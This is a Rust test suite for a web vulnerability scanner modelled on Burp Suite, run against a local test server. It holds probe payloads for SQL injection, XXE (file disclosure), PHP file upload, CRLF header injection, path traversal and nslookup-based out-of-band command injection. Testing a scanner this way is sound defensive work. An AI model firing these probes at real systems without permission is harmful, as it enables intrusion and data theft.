        let sqli = find("SQL injection", "/item");
        assert_eq!(sqli.type_id, 0x0010_0200);
        assert!(String::from_utf8_lossy(&sqli.evidence[0].request).starts_with("GET /item?id=5' HTTP/1.1"), "{}", String::from_utf8_lossy(&sqli.evidence[0].request));
        let xxe = find("XML external entity injection", "/xml");
        assert!(String::from_utf8_lossy(&xxe.evidence[0].request).contains("<!DOCTYPE"));
        assert!(String::from_utf8_lossy(xxe.evidence[0].response.as_deref().unwrap()).contains("root:x:0:0"));
        assert_eq!(find("Active probe: TRACE method enabled (cross-site tracing)", "/go").type_id, 0);
        drop(issues);

        // By default (extra checks off) only issue types Burp has are
        // reported: the same scan of /go raises no "Active probe" issue.
        let default = net::Shared::new();
        let mut e = entry("/go?url=x", false, "");
        e.host = "127.0.0.1".into();
        e.port = port;
        e.req_raw = format!("GET /go?url=x HTTP/1.1\r\nHost: {host}\r\n\r\n").into_bytes().into();
        start_active_scan(default.clone(), e, &[], &[]);
        let t0 = std::time::Instant::now();
        while default.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(180) {
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        let names: Vec<String> = default.issues.lock().unwrap().iter().map(|i| i.name.clone()).collect();
        assert!(names.iter().any(|n| n == "Open redirection (reflected)"), "{names:?}");
        assert!(names.iter().all(|n| is_burp_issue(n)), "non-Burp issue types by default: {names:?}");
    }

    /// Recorded from the pre-refactor scanner (single-threaded
    /// start_active_scan, 2026-11-16) and unchanged since.
    const CHARACTERISATION_ISSUES: &[(&str, &str, &str, &str)] = &[
        ("Active probe: DOM-based cross-site scripting (reflected) via parameter sort", "high", "Firm", "/search"),
        ("Active probe: TRACE method enabled (cross-site tracing)", "medium", "Firm", "/board"),
        ("Active probe: TRACE method enabled (cross-site tracing)", "medium", "Firm", "/go"),
        ("Active probe: TRACE method enabled (cross-site tracing)", "medium", "Firm", "/item"),
        ("Active probe: TRACE method enabled (cross-site tracing)", "medium", "Firm", "/search"),
        ("Active probe: TRACE method enabled (cross-site tracing)", "medium", "Firm", "/search"),
        ("Active probe: TRACE method enabled (cross-site tracing)", "medium", "Firm", "/transfer"),
        ("Active probe: TRACE method enabled (cross-site tracing)", "medium", "Firm", "/xml"),
        ("Active probe: attacker-set header value reflected (header manipulation)", "low", "Firm", "/search"),
        ("Active probe: attacker-set header value reflected (header manipulation)", "low", "Firm", "/search"),
        ("Active probe: permissive HTTP methods advertised via OPTIONS", "low", "Firm", "/board"),
        ("Active probe: permissive HTTP methods advertised via OPTIONS", "low", "Firm", "/go"),
        ("Active probe: permissive HTTP methods advertised via OPTIONS", "low", "Firm", "/item"),
        ("Active probe: permissive HTTP methods advertised via OPTIONS", "low", "Firm", "/search"),
        ("Active probe: permissive HTTP methods advertised via OPTIONS", "low", "Firm", "/search"),
        ("Active probe: permissive HTTP methods advertised via OPTIONS", "low", "Firm", "/transfer"),
        ("Active probe: permissive HTTP methods advertised via OPTIONS", "low", "Firm", "/xml"),
        // Once per later point of /board (msg, the URL parameter name,
        // Referer, filename): the stored-echo pass re-reports surviving
        // markers after every point.
        ("Active probe: value of parameter msg appears stored", "medium", "Firm", "/board"),
        ("Active probe: value of parameter msg appears stored", "medium", "Firm", "/board"),
        ("Active probe: value of parameter msg appears stored", "medium", "Firm", "/board"),
        ("Active probe: value of parameter msg appears stored", "medium", "Firm", "/board"),
        ("Cross-origin resource sharing", "info", "Certain", "/board"),
        ("Cross-origin resource sharing", "info", "Certain", "/go"),
        ("Cross-origin resource sharing", "info", "Certain", "/item"),
        ("Cross-origin resource sharing", "info", "Certain", "/search"),
        ("Cross-origin resource sharing", "info", "Certain", "/search"),
        ("Cross-origin resource sharing", "info", "Certain", "/transfer"),
        ("Cross-origin resource sharing", "info", "Certain", "/xml"),
        ("Cross-origin resource sharing: arbitrary origin trusted", "high", "Certain", "/board"),
        ("Cross-origin resource sharing: arbitrary origin trusted", "high", "Certain", "/go"),
        ("Cross-origin resource sharing: arbitrary origin trusted", "high", "Certain", "/item"),
        ("Cross-origin resource sharing: arbitrary origin trusted", "high", "Certain", "/search"),
        ("Cross-origin resource sharing: arbitrary origin trusted", "high", "Certain", "/search"),
        ("Cross-origin resource sharing: arbitrary origin trusted", "high", "Certain", "/transfer"),
        ("Cross-origin resource sharing: arbitrary origin trusted", "high", "Certain", "/xml"),
        ("Cross-site request forgery", "medium", "Firm", "/transfer"),
        ("Cross-site scripting (reflected)", "high", "Certain", "/search"),
        ("File path traversal", "high", "Firm", "/search"),
        ("HTTP TRACE method is enabled", "info", "Certain", "/"),
        ("HTTP response header injection", "high", "Certain", "/go"),
        ("Input returned in response (reflected)", "info", "Certain", "/board"),
        ("Input returned in response (reflected)", "info", "Certain", "/go"),
        ("Input returned in response (reflected)", "info", "Certain", "/search"),
        ("Input returned in response (reflected)", "info", "Certain", "/search"),
        ("Input returned in response (reflected)", "info", "Certain", "/search"),
        ("Link manipulation (reflected)", "info", "Firm", "/go"),
        ("Open redirection (reflected)", "low", "Certain", "/go"),
        ("SQL injection", "high", "Certain", "/item"),
        ("SQL injection", "high", "Certain", "/search"),
        ("Server-side template injection", "high", "Tentative", "/search"),
        ("XML external entity injection", "high", "Firm", "/xml"),
    ];

    /// The Collaborator-backed checks register pending issues that carry the
    /// probe they sent. The ids are made-up strings; the only traffic is to
    /// the local server.
    #[test]
    fn collaborator_pending_issues_carry_their_probe() {
        let port = characterisation_server();
        let shared = net::Shared::new();
        let req = format!("GET /search?q=hello HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n");
        let slots = slots_for(req.as_bytes(), ScanSpeed::Normal, &Default::default());
        assert_eq!(&slots[..3], ["#0:ext", "#0:xsd", "#0:xi"]);
        let oob: Vec<(String, String, String)> = slots.iter().enumerate().map(|(i, s)| (s.clone(), format!("tok{i}"), format!("tok{i}.oob.invalid"))).collect();
        let smtp = vec![SmtpOob { param: "q".into(), simple: ("smtpa".into(), "smtpa.oob.invalid".into()), enclosed: ("smtpb".into(), "smtpb.oob.invalid".into()) }];
        let mut e = entry("/search?q=hello", false, "");
        e.host = "127.0.0.1".into();
        e.port = port;
        e.req_raw = req.into_bytes().into();
        start_active_scan(shared.clone(), e, &oob, &smtp);
        let t0 = std::time::Instant::now();
        while shared.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(180) {
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        assert!(!shared.scan.is_busy(), "scan did not finish");
        let pending = shared.oob.pending();
        let get = |token: &str| pending.iter().find(|(t, _, _)| t == token).unwrap_or_else(|| panic!("{token} not pending"));
        for (token, kind, needle) in [("tok0", None, "tok0.oob.invalid"), ("tok1", Some("DNS"), "tok1.oob.invalid"), ("tok2", Some("DNS"), "tok2.oob.invalid"), ("smtpa", Some("SMTP"), "smtpa.oob.invalid"), ("smtpb", Some("SMTP"), "smtpb.oob.invalid"), ("tok3", Some("CNAME"), "tok3.oob.invalid"), ("tok6", Some("CNAME"), "tok6.oob.invalid")] {
            let (_, k, issue) = get(token);
            assert_eq!(*k, kind, "{token}");
            assert_eq!(issue.evidence.len(), 1, "{token}");
            let ev = &issue.evidence[0];
            assert!(String::from_utf8_lossy(&ev.request).contains(needle), "{token}: {}", String::from_utf8_lossy(&ev.request));
            assert!(ev.response.is_some(), "{token}: response not attached");
        }
        assert_eq!(get("tok1").2.type_id, issue_type_id("XML injection"));
        assert_eq!(get("smtpa").2.type_id, issue_type_id("SMTP header injection"));
        // burp.Zc99 at normal speed: replace, pipe, ampersand, combined.
        assert_eq!(&slots[3..7], ["#0:cmd0", "#0:cmd1", "#0:cmd2", "#0:cmd3"]);
        let cmd = &get("tok3").2;
        assert_eq!((cmd.name.as_str(), cmd.sev.as_str(), cmd.confidence.as_str()), ("OS command injection", "high", "Firm"));
        assert!(String::from_utf8_lossy(&cmd.evidence[0].request).contains("nslookup"), "replace payload sent");
    }

    /// Passive issues carry the audited exchange; the report shows stored
    /// evidence and falls back to the history entry only without it.
    #[test]
    fn passive_issues_carry_their_exchange_as_evidence() {
        let e = entry("/page", false, &clean());
        let v = passive_check(&e);
        assert!(!v.is_empty());
        assert!(v.iter().all(|i| i.evidence.len() == 1 && *i.evidence[0].request == *e.req_raw && i.evidence[0].response.as_deref() == e.resp_raw.as_deref()));

        let big = vec![b'a'; EVIDENCE_MAX_BYTES + 10];
        assert_eq!(ScanEvidence::new(&big, Some(&big[..])).request.len(), EVIDENCE_MAX_BYTES);

    }

    #[test]
    fn insertion_points_follow_burp_order_and_cap() {
        let req = "POST /shop/cart/add?id=7 HTTP/1.1\r\nHost: h\r\nUser-Agent: UA/1\r\nX-Forwarded-For: 10.0.0.1\r\nCookie: _ga=GA1.2; sid=abc; AWSALB=zz; lang=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 5\r\n\r\nqty=2";
        let got: Vec<(IpKind, String)> = insertion_points(req).into_iter().map(|p| (p.kind, p.name)).collect();
        let want: Vec<(IpKind, &str)> = vec![
            (IpKind::Query, "id"),
            (IpKind::Body, "qty"),
            (IpKind::Cookie, "sid"),
            (IpKind::Cookie, "lang"),
            (IpKind::Header, "X-Forwarded-For"),
            (IpKind::ParamName(NameSite::Body), ""),
            (IpKind::ParamName(NameSite::Url), ""),
            (IpKind::Header, "User-Agent"),
            (IpKind::Header, "Referer"),
            (IpKind::PathFolder(0), "URL path folder 1"),
            (IpKind::PathFolder(1), "URL path folder 2"),
            (IpKind::PathFilename(2), "URL path filename"),
        ];
        assert_eq!(got, want.into_iter().map(|(k, n)| (k, n.to_string())).collect::<Vec<_>>());
        // 40 URL parameters: the cap keeps the first 30 accepted points, so
        // the headers and path points (built last) fall off.
        let q: Vec<String> = (0..40).map(|i| format!("p{i}=v")).collect();
        let busy = format!("GET /a/b?{} HTTP/1.1\r\nHost: h\r\nCookie: _ga=1; _gid=2\r\n\r\n", q.join("&"));
        let pts = insertion_points(&busy);
        assert_eq!(pts.len(), MAX_INSERTION_POINTS);
        assert!(pts.iter().all(|p| p.kind == IpKind::Query));
        assert_eq!(pts[29].name, "p29");
    }

    #[test]
    fn query_insertion_point() {
        let req = "GET /s?q=shoes&page=2 HTTP/1.1\r\nHost: h\r\n\r\n";
        let ip = &insertion_points(req)[0];
        assert_eq!((ip.kind.clone(), ip.name.as_str(), ip.value.as_str()), (IpKind::Query, "q", "shoes"));
        let r = inject_payload(req, ip, &"a b&c");
        assert!(r.starts_with("GET /s?q=a%20b%26c&page=2 HTTP/1.1\r\n"), "{r}");
    }

    #[test]
    fn multipart_insertion_points_and_file_upload_part() {
        let body = "--XyZ\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nhello\r\n--XyZ\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"cv.pdf\"\r\nContent-Type: application/pdf\r\n\r\n%PDF-1\r\n--XyZ--\r\n";
        let req = format!("POST /upload HTTP/1.1\r\nHost: h\r\nContent-Type: multipart/form-data; boundary=XyZ\r\nContent-Length: {}\r\n\r\n{body}", body.len());
        let pts: Vec<InsertionPoint> = insertion_points(&req).into_iter().filter(|p| matches!(p.kind, IpKind::Multipart { .. })).collect();
        assert_eq!(pts.len(), 2, "a multipart body is not misread as a form body");
        assert_eq!((pts[0].name.as_str(), pts[0].value.as_str()), ("title", "hello"));
        assert_eq!(pts[0].kind, IpKind::Multipart { index: 0, filename: None });
        assert_eq!(pts[1].kind, IpKind::Multipart { index: 1, filename: Some("cv.pdf".into()) });
        assert_eq!(pts[1].value, "%PDF-1");
        // A probe replaces the part content (raw) and restamps the length.
        let r = inject_payload(&req, &pts[0], "a'\"");
        let new_body = r.split_once("\r\n\r\n").unwrap().1;
        assert!(new_body.contains("name=\"title\"\r\n\r\na'\"\r\n--XyZ"), "{new_body}");
        assert!(r.contains(&format!("Content-Length: {}\r\n", new_body.len())));
        // File-upload rewrite (burp.Ziqg.ZL): filename, part type and content.
        let r = with_multipart_part(&req, 1, "<?php x ?>", Some("cv.pdfabc.php"), Some("text/plain"));
        let new_body = r.split_once("\r\n\r\n").unwrap().1;
        assert!(new_body.contains("filename=\"cv.pdfabc.php\"\r\nContent-Type: text/plain\r\n\r\n<?php x ?>\r\n--XyZ--"), "{new_body}");
        assert!(new_body.contains("name=\"title\"\r\n\r\nhello\r\n"), "other parts untouched");
    }

    #[test]
    fn cookie_insertion_point() {
        let req = "GET / HTTP/1.1\r\nHost: h\r\nCookie: _gat=1; sid=abc; theme=dark\r\n\r\n";
        let pts: Vec<InsertionPoint> = insertion_points(req).into_iter().filter(|p| p.kind == IpKind::Cookie).collect();
        assert_eq!(pts.iter().map(|p| p.name.as_str()).collect::<Vec<_>>(), vec!["sid", "theme"], "_gat is skip-listed");
        let r = inject_payload(req, &pts[0], &"x';y");
        assert!(r.contains("\r\nCookie: _gat=1; sid=x'%3By; theme=dark\r\n"), "{r}");
    }

    #[test]
    fn header_insertion_points() {
        let req = "GET /p HTTP/1.1\r\nHost: h\r\nUser-Agent: UA\r\nReferer: https://h/home\r\nX-Api-Version: 2\r\nAccept: */*\r\n\r\n";
        let hdrs: Vec<(String, String)> =
            insertion_points(req).into_iter().filter(|p| p.kind == IpKind::Header).map(|p| (p.name, p.value)).collect();
        // Only X-* headers, User-Agent and Referer are fuzzed (no Host, Accept).
        assert_eq!(hdrs, vec![
            ("X-Api-Version".to_string(), "2".to_string()),
            ("User-Agent".to_string(), "UA".to_string()),
            ("Referer".to_string(), "https://h/home".to_string()),
        ]);
        let ua = InsertionPoint::new(IpKind::Header, "User-Agent", "UA");
        // Decoded for the header, but a CR/LF stays encoded: no new header line.
        let r = inject_payload(req, &ua, &"a b\r\nX-Evil: 1");
        assert!(r.contains("\r\nUser-Agent: a b%0D%0AX-Evil: 1\r\n") && !r.contains("\r\nX-Evil:"), "{r}");
        // Without a Referer, Burp synthesises one (Zuq.ZE) and the probe adds it.
        let bare = "GET /p HTTP/1.1\r\nHost: h\r\n\r\n";
        let rf = insertion_points(bare).into_iter().find(|p| p.name == "Referer").unwrap();
        assert_eq!(rf.value, SYNTH_REFERER);
        assert!(inject(bare, &rf, "https://example.com/zz").contains("\r\nReferer: https://example.com/zz\r\n"));
        // A header name with a multibyte char at byte 2 must not panic.
        assert!(!insertion_points("GET / HTTP/1.1\r\nHost: h\r\nXé-a: 1\r\n\r\n").iter().any(|p| p.name.starts_with('X')));
    }

    #[test]
    fn url_path_folder_and_filename_insertion_points() {
        let req = "GET /api/v1/users.json?x=1 HTTP/1.1\r\nHost: h\r\n\r\n";
        let pts: Vec<InsertionPoint> = insertion_points(req).into_iter().filter(|p| matches!(p.kind, IpKind::PathFolder(_) | IpKind::PathFilename(_))).collect();
        assert_eq!(pts.len(), 3);
        assert_eq!((pts[1].kind.clone(), pts[1].value.as_str()), (IpKind::PathFolder(1), "v1"));
        assert_eq!((pts[2].kind.clone(), pts[2].value.as_str()), (IpKind::PathFilename(2), "users.json"));
        let r = inject_payload(req, &pts[1], &"../x");
        assert!(r.starts_with("GET /api/..%2Fx/users.json?x=1 HTTP/1.1\r\n"), "{r}");
        let r = inject(req, &pts[2], "users.jsonzz");
        assert!(r.starts_with("GET /api/v1/users.jsonzz?x=1 HTTP/1.1\r\n"), "{r}");
        // Empty segments do not advance the folder number (burp.Zhjs.ZK).
        assert_eq!(path_insertion_points("//a/b")[0].0, "URL path folder 1");
    }

    #[test]
    fn pooled_oob_hands_out_one_payload_per_slot_until_the_pool_is_dry() {
        let shared = Shared::new();
        let req = b"GET /a?x=1&y=2 HTTP/1.1\r\nHost: h\r\n\r\n";
        let slots = slots_for(req, ScanSpeed::Normal, &Default::default());
        assert!(slots.len() >= 2, "{slots:?}");
        // No pool (headless): nothing, and no waiting because nobody was asked.
        assert!(pooled_oob(&shared, req).is_empty());
        // Fewer payloads than slots: the first slots get them, the pool empties.
        shared.oob.stock([("t1".into(), "t1.oast.test".into()), ("t2".into(), "t2.oast.test".into())]);
        let got = pooled_oob(&shared, req);
        assert_eq!(got.len(), 2);
        assert_eq!(got.iter().map(|(s, _, _)| s.clone()).collect::<Vec<_>>(), slots[..2].to_vec());
        assert!(got.iter().all(|(_, t, d)| d.starts_with(t.as_str())));
        assert_eq!(shared.oob.pool_len(), 0);
        // A request without insertion points takes nothing.
        shared.oob.stock([("t3".into(), "t3.oast.test".into())]);
        assert!(pooled_oob(&shared, b"GET / HTTP/1.1\r\nHost: h\r\n\r\n").len() <= 1);
    }

    #[test]
    fn oob_slots_cover_every_point_and_xml_oob_where_it_applies() {
        let req = b"GET /p?q=1 HTTP/1.1\r\nHost: h\r\n\r\n";
        // q (query), the URL parameter name (no out-of-band check runs on
        // it: Zibp.ZU, Zx8l, Zp7s), Referer (header), filename "p" (path).
        let cmd = |i: usize| (0..4).map(move |k| format!("#{i}:cmd{k}"));
        let want: Vec<String> = ["#0:ext", "#0:xsd", "#0:xi"]
            .iter()
            .map(|s| s.to_string())
            .chain(cmd(0))
            .chain(["#2:ext".to_string()])
            .chain(cmd(2))
            .chain(["#3:ext", "#3:xsd", "#3:xi"].iter().map(|s| s.to_string()))
            .chain(cmd(3))
            // Collaborator everywhere (burp.Zc7h), once per request.
            .chain(checks::EVERYWHERE_SLOTS.iter().map(|s| format!("#host:ce:{s}")))
            .collect();
        let default = crate::scan_config::ScanConfig::default();
        assert_eq!(slots_for(req, ScanSpeed::Normal, &default), want);
        assert_eq!(slots_for(req, ScanSpeed::Fast, &default).iter().filter(|s| s.contains(":cmd")).count(), 3, "Fast: the combined payload only, one per point");
        let oob = vec![
            ("#0:xi".to_string(), "t1".to_string(), "h1".to_string()),
            ("q".to_string(), "t0".to_string(), "h0".to_string()),
        ];
        let mut used = Vec::new();
        assert_eq!(oob_slot(&oob, 0, "q", "ext", &mut used).map(|x| x.1.as_str()), Some("t0"), "legacy name-keyed entry");
        assert_eq!(oob_slot(&oob, 3, "q", "ext", &mut used), None, "used once");
        assert_eq!(oob_slot(&oob, 0, "q", "xi", &mut used).map(|x| x.1.as_str()), Some("t1"));
        assert_eq!(reflected_xss_severity(&IpKind::Header), "low");
        assert_eq!(reflected_xss_severity(&IpKind::Cookie), "medium");
        assert_eq!(reflected_xss_severity(&IpKind::Query), "high");
    }

    #[test]
    fn same_origin_resolution_keeps_traffic_on_the_target() {
        assert_eq!(same_origin_path("/js/a.js", false, "h:8000", "/x/y").as_deref(), Some("/js/a.js"));
        assert_eq!(same_origin_path("a.js", false, "h:8000", "/x/y?q=1").as_deref(), Some("/x/a.js"));
        assert_eq!(same_origin_path("http://h:8000/z", false, "h:8000", "/").as_deref(), Some("/z"));
        assert_eq!(same_origin_path("//cdn.example/angular.js", false, "h:8000", "/"), None);
        assert_eq!(same_origin_path("https://h:8000/z", false, "h:8000", "/"), None, "other scheme is another origin");
        let g = get_request_like("POST /f HTTP/1.1\r\nHost: h\r\nCookie: s=1\r\nContent-Type: a/b\r\nContent-Length: 3\r\n\r\nx=1", "/view");
        assert_eq!(g, "GET /view HTTP/1.1\r\nHost: h\r\nCookie: s=1\r\n\r\n");
    }


    #[test]
    fn email_finder_follows_burp_zflt() {
        assert_eq!(find_emails("contact admin@example.com today"), vec!["admin@example.com".to_string()]);
        // Juice Shop's fake TLD is not on Burp's list.
        assert!(find_emails("{\"hint\":\"jwtn3d@juice-sh.op\"}").is_empty());
        // Single-letter labels are rejected (each label must be 2-63 long).
        assert!(find_emails("a@b.com").is_empty());
        assert!(find_emails("user@x.co.uk").is_empty());
        assert_eq!(find_emails("user@mail.co.uk"), vec!["user@mail.co.uk".to_string()]);
        // Addresses the request already carried are not disclosures.
        assert!(find_email_excluding("hi bob@example.com", "POST / HTTP/1.1\r\n\r\nemail=bob@example.com").is_none());
    }

    /// burp.Zp7s error-based: markers that only appear after "]]>><" is
    /// appended; values with angle brackets and baseline markers are excluded.
    #[test]
    fn xml_injection_follows_zp7s() {
        let base = b"HTTP/1.1 200 OK\r\n\r\n<p>hello</p>".to_vec();
        let vuln = |p: &str| Some(if p.ends_with("]]>><") { b"HTTP/1.1 500 Error\r\n\r\n<soap:Envelope><soap:Body>fault</soap:Body>".to_vec() } else { b"HTTP/1.1 200 OK\r\n\r\n<p>hello</p>".to_vec() });
        let hit = run_xml_injection_check("bob", &base, 2, vuln, || Some(base.clone())).unwrap();
        assert!(hit.contains(&"soap:") && hit.contains(&"soap:body"));
        // Markers already in the baseline do not count.
        let soapy = b"HTTP/1.1 200 OK\r\n\r\n<soap:Body/>".to_vec();
        assert!(run_xml_injection_check("bob", &soapy, 2, |_| Some(soapy.clone()), || Some(soapy.clone())).is_none());
        // Values that already carry markup are skipped (Zp7s.ZQ).
        assert!(run_xml_injection_check("<a>", &base, 2, vuln, || Some(base.clone())).is_none());
        // Markers inside an ASP.NET viewstate are ignored (Zw4k.ZI).
        let vs = |_: &str| Some(b"HTTP/1.1 200 OK\r\n\r\n<input name=\"__VIEWSTATE\" value=\"soap:body\">".to_vec());
        assert!(run_xml_injection_check("bob", &base, 1, vs, || Some(base.clone())).is_none());
    }

    /// Cases probed against burp.Zh63.Zi (build 52685) with a 66-byte head.
    #[test]
    fn burp_sniffer_binary_gate() {
        let head = b"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\n\r\n".to_vec();
        assert_eq!(head.len(), 66);
        let msg = |body: Vec<u8>| [head.clone(), body].concat();
        // 954-byte message: threshold 19 high bytes.
        let probe = |k: usize| msg([b"{\"a\":\"".to_vec(), vec![b'x'; 880 - k], vec![0xE9; k], b"\"}".to_vec()].concat());
        assert!(!burp_sniff_unknown(&probe(18), 66));
        assert!(burp_sniff_unknown(&probe(19), 66));
        let u = "é".repeat(60);
        assert!(burp_sniff_unknown(&msg(format!("{{\"a\":\"{u}\"}}").into_bytes()), 66));
        assert!(burp_sniff_unknown(&msg(format!("<div>{u}</div>").into_bytes()), 66));
        assert!(!burp_sniff_unknown(&msg(format!("\n  <html><p>{u}</p></html>").into_bytes()), 66));
        assert!(!burp_sniff_unknown(&msg(format!("<!DOCTYPE html><p>{u}</p>").into_bytes()), 66));
        assert!(!burp_sniff_unknown(&msg(format!("<?xml version=\"1.0\"?><a>{u}</a>").into_bytes()), 66));
        // Juice Shop /rest/memories/ shape: emails behind a binary-gated JSON body are not reported.
        let body = format!("{{\"data\":[{{\"caption\":\"{u}\",\"User\":{{\"email\":\"bjoern@owasp.org\"}}}}]}}");
        let json: &[(&str, &str)] = &[("Content-Type", "application/json; charset=utf-8")];
        assert!(!has(&passive_check(&entry("/rest/memories/", true, &resp("200 OK", json, &body))), CH_EMAIL));
        let short = "{\"User\":{\"email\":\"bjoern@owasp.org\"}}";
        assert!(has(&passive_check(&entry("/rest/memories/", true, &resp("200 OK", json, short))), CH_EMAIL));
    }

    #[test]
    fn crawl_links_resolve_same_origin_paths() {
        let resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<a href=\"styles.css\">x</a><a href=\"/ftp/\">f</a><a href=\"https://evil.test/\">e</a><a href=\"../up?a=1#frag\">u</a><img src=\"http://127.0.0.1:3001/logo.png\">";
        let l = crawl_links("http://127.0.0.1:3001", "/a/b/index.html", resp);
        assert_eq!(l, vec!["/a/b/styles.css", "/ftp/", "/a/up?a=1", "/logo.png"]);
        let listing = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<a href=\"./..\">up</a><a href=\".\">here</a>";
        assert_eq!(crawl_links("http://h", "/ftp/quarantine", listing), vec!["/", "/ftp/"]);
        let js = b"HTTP/1.1 200 OK\r\nContent-Type: application/javascript\r\n\r\nx.href=`a`;y.src=\"b.js\"";
        assert!(crawl_links("http://h", "/main.js", js).is_empty());
    }

    #[test]
    fn mime_checks_follow_burp_zf9p() {
        let names = |r: &[u8]| mime_issues(r).iter().map(|c| c.name).collect::<Vec<_>>();
        assert_eq!(names(b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nok"), vec!["HTML does not specify charset"]);
        assert!(names(b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n\r\nok").is_empty());
        assert!(names(b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<meta charset=\"UTF-8\">").is_empty());
        assert_eq!(names(b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=koi8-r\r\n\r\nok"), vec!["HTML uses unrecognized charset"]);
        assert_eq!(names(b"HTTP/1.1 200 OK\r\n\r\nok"), vec!["Content type is not specified"]);
        assert!(names(b"HTTP/1.1 302 Found\r\nContent-Type: text/html\r\n\r\nmoved").is_empty());
        assert_eq!(names(b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Type: application/json\r\n\r\n{}"), vec!["Multiple content types specified"]);
    }

    #[test]
    fn card_scanner_follows_burp_zu0p() {
        assert_eq!(find_card("card 4111 1111 1111 1111 ok").as_deref(), Some("4111 1111 1111 1111"));
        assert_eq!(find_card("x=378282246310005;").as_deref(), Some("378282246310005"));
        // Glued to letters on either side: not a card (Burp's boundary rule).
        assert!(find_card("id4111111111111111").is_none());
        assert!(find_card("4111111111111111px").is_none());
        // Luhn-valid but no issuer prefix for the length.
        assert!(find_card(" 7992739871300000 ").is_none());
        // SVG path data from Juice Shop's main.js (a false positive before).
        assert!(find_card("`M504 256C504 119 393 8 256 8S8 119 8 256s111 248 248 248 248-111 248-248z`").is_none());
    }

    #[test]
    fn non_burp_passive_issues_are_off_by_default() {
        let shared = net::Shared::new();
        let mut h = CLEAN_HEADERS.to_vec();
        h.push(("X-Powered-By", "Express"));
        let e = entry("/app", true, &resp("200 OK", &h, "<html></html>"));
        add_passive_issues(&shared, passive_check(&e));
        assert!(shared.issues.lock().unwrap().is_empty(), "X-Powered-By is not a Burp issue");
        assert!(is_burp_issue("Unencrypted communications"));
        assert!(is_burp_issue("TLS cookie without secure flag set"));
        assert!(!is_burp_issue("Referrer-Policy header not set"));
    }
}
